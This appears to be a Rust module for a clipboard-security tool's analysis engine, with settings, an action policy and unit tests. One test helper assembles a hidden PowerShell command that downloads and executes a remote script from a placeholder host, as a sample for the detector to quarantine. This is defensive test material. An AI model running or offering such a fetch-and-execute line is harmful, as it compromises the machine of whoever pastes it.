//! One entry point for the apps (desktop, extension, CLI, WASM): analyze a piece
//! of clipboard text in a [`Context`] under user [`Settings`] and get a [`Report`]
//! with the recommended [`Action`] (phase-1.md §1.1).
//!
//! Stateful logic (clipboard guard, wallet-swap detector, notification throttle,
//! paste interception) lives in [`crate::policy`] / [`crate::wallet`]; the apps
//! drive those state machines with the results of [`Engine::analyze`].

use serde::{Deserialize, Serialize};

use crate::command::{self, CommandFinding};
use crate::secret::{self, PackSet, SecretMatch};
use crate::wallet::{self, WalletAddressMatch};
use crate::{Context, Level, Verdict, hidden, limits};

/// User settings shared by every front end. `Settings::default()` is the strict
/// profile (project decision): block clear scams, warn on everything else, and
/// keep every AI feature off.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "snake_case")]
pub struct Settings {
    /// Clear (quarantine) the clipboard when a command is Malicious. Off = warn only.
    pub block_malicious_commands: bool,
    /// Warn about Suspicious commands (e.g. official installers).
    pub warn_suspicious_commands: bool,
    /// Detect PII / API keys / mnemonics / connection strings.
    pub detect_secrets: bool,
    /// Detect invisible characters and homoglyphs.
    pub detect_hidden_chars: bool,
    /// PII packs to enable (`universal`, `tw`, `us`, …). Empty = `universal` + `tw`.
    pub packs: Vec<String>,
    /// Optional AI features (Phase 5). Off by default; when off nothing ever
    /// contacts an LLM endpoint.
    pub ai: AiSettings,
}

impl Default for Settings {
    fn default() -> Self {
        Settings {
            block_malicious_commands: true,
            warn_suspicious_commands: true,
            detect_secrets: true,
            detect_hidden_chars: true,
            packs: Vec::new(),
            ai: AiSettings::default(),
        }
    }
}

/// AI feature switches. Everything is off by default.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "snake_case")]
pub struct AiSettings {
    /// Tier-2 plain-language explanation of high-risk commands.
    pub explain_commands: bool,
}

/// What the app should do with the clipboard content.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Action {
    /// Nothing to report.
    Allow,
    /// Notify the user; leave the clipboard alone.
    Warn,
    /// Clear the clipboard (keep the original in memory so the user can restore it).
    Quarantine,
}

/// Everything the engine found in one piece of text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Report {
    /// Command analysis (always present; `verdict.level == None` when nothing found).
    pub command: CommandFinding,
    /// Detected secrets (empty when disabled in settings). Spans index the analyzed prefix.
    pub secrets: Vec<SecretMatch>,
    /// Invisible-character / homoglyph verdict.
    pub hidden: Verdict,
    /// Wallet addresses (input for the stateful swap detector).
    pub wallets: Vec<WalletAddressMatch>,
    /// Only a prefix of the text was analyzed ([`limits::MAX_ANALYZED_CHARS`]).
    pub truncated: bool,
    /// Recommended action under the engine's settings.
    pub action: Action,
}

/// The analysis engine. Cheap to construct; rule sets are compiled lazily and shared.
#[derive(Debug, Clone)]
pub struct Engine {
    settings: Settings,
    packs: PackSet,
}

impl Default for Engine {
    fn default() -> Self {
        Engine::new(Settings::default())
    }
}

impl Engine {
    pub fn new(settings: Settings) -> Engine {
        let packs = if settings.packs.is_empty() {
            PackSet::default()
        } else {
            PackSet::from_codes(&settings.packs)
        };
        Engine { settings, packs }
    }

    pub fn settings(&self) -> &Settings {
        &self.settings
    }

    /// Analyzes `text` (only its first [`limits::MAX_ANALYZED_CHARS`] chars).
    pub fn analyze(&self, text: &str, ctx: &Context) -> Report {
        let analyzed = limits::prefix(text);
        let command = command::analyze_in(analyzed, ctx);
        let secrets = if self.settings.detect_secrets {
            secret::find(analyzed, &self.packs)
        } else {
            Vec::new()
        };
        let hidden = if self.settings.detect_hidden_chars {
            hidden::analyze(analyzed)
        } else {
            Verdict::CLEAN
        };
        let wallets = wallet::find_all(analyzed);
        let action = self.action(&command.verdict, &secrets, &hidden);
        Report {
            command,
            secrets,
            hidden,
            wallets,
            truncated: analyzed.len() < text.len(),
            action,
        }
    }

    /// The text with every detected secret masked ("paste masked version").
    /// `pem_body_mask` is the localized placeholder for a private-key body
    /// (render [`secret::pem_body_mask_message`]).
    pub fn masked(&self, text: &str, report: &Report, pem_body_mask: &str) -> String {
        let analyzed = limits::prefix(text);
        let mut out = secret::mask_text(analyzed, &report.secrets, pem_body_mask);
        out.push_str(&text[analyzed.len()..]);
        out
    }

    fn action(&self, command: &Verdict, secrets: &[SecretMatch], hidden: &Verdict) -> Action {
        match command.level {
            Level::Malicious if self.settings.block_malicious_commands => {
                return Action::Quarantine;
            }
            Level::Malicious => return Action::Warn,
            Level::Suspicious if self.settings.warn_suspicious_commands => return Action::Warn,
            _ => {}
        }
        if !secrets.is_empty() || hidden.level != Level::None {
            return Action::Warn;
        }
        Action::Allow
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine(f: impl FnOnce(&mut Settings)) -> Engine {
        let mut s = Settings::default();
        f(&mut s);
        Engine::new(s)
    }

    fn clickfix() -> String {
        [
            "power",
            "shell -w hidden -c \"i",
            "ex(i",
            "wr 'https://example.invalid/a.ps1')\"",
        ]
        .concat()
    }

    #[test]
    fn defaults_are_strict_and_ai_is_off() {
        let s = Settings::default();
        assert!(s.block_malicious_commands && s.warn_suspicious_commands);
        assert!(s.detect_secrets && s.detect_hidden_chars);
        assert!(!s.ai.explain_commands);
    }

    #[test]
    fn settings_round_trip_and_fill_defaults() {
        let s: Settings = serde_json::from_str(r#"{"detect_secrets": false}"#).unwrap();
        assert!(!s.detect_secrets);
        assert!(
            s.block_malicious_commands,
            "missing fields take the strict default"
        );
        let back: Settings = serde_json::from_str(&serde_json::to_string(&s).unwrap()).unwrap();
        assert_eq!(back, s);
    }

    #[test]
    fn malicious_command_is_quarantined_unless_blocking_is_off() {
        let ctx = Context::default();
        let r = Engine::default().analyze(&clickfix(), &ctx);
        assert_eq!(r.command.verdict.level, Level::Malicious);
        assert_eq!(r.action, Action::Quarantine);
        let r = engine(|s| s.block_malicious_commands = false).analyze(&clickfix(), &ctx);
        assert_eq!(r.action, Action::Warn);
    }

    #[test]
    fn secrets_warn_and_mask() {
        let text = "身分證 A123456789 請勿外流";
        let e = Engine::default();
        let r = e.analyze(text, &Context::default());
        assert_eq!(r.action, Action::Warn);
        assert!(!e.masked(text, &r, "[masked]").contains("A123456789"));
        let off = engine(|s| s.detect_secrets = false).analyze(text, &Context::default());
        assert!(off.secrets.is_empty());
        assert_eq!(off.action, Action::Allow);
    }

    #[test]
    fn plain_text_is_allowed() {
        let r = Engine::default().analyze("明天下午三點開會", &Context::default());
        assert_eq!(r.action, Action::Allow);
        assert!(!r.truncated);
    }

    #[test]
    fn long_text_is_truncated_and_masked_text_keeps_the_tail() {
        let text = format!("{}tail", "a".repeat(limits::MAX_ANALYZED_CHARS));
        let e = Engine::default();
        let r = e.analyze(&text, &Context::default());
        assert!(r.truncated);
        assert_eq!(e.masked(&text, &r, "[masked]"), text);
    }
}
